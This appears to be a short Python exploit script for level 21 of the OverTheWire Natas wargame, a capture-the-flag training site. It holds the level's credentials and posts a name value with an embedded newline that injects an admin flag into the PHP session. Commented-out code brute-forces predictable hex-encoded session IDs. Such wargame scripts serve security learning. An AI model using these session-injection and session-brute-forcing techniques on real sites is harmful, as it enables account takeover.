import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
user = 'natas21'
url  = 'http://natas21.natas.labs.overthewire.org'


#cookies are encode like this:
# 123-<username> as hex 

r = requests.Session();
r.auth = (user,key)

response = r.post(url + '?debug' , cookies={'PHPSESSID':'5'}, data={'name' : 'admin\nadmin 1'})
# response = r.post(url + '?debug' ,  data={'name[]' : 'admin'})

print response.headers
print response.text

# for i in range(1,641):

#     session_string = `i` + '-admin'
#     print 'request sessionid', str(i)
    
#     response = r.get(url, cookies={'PHPSESSID': session_string.encode('hex') })
#     if ( 'Password:' in response.text ):
#         print response.text
#         break


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
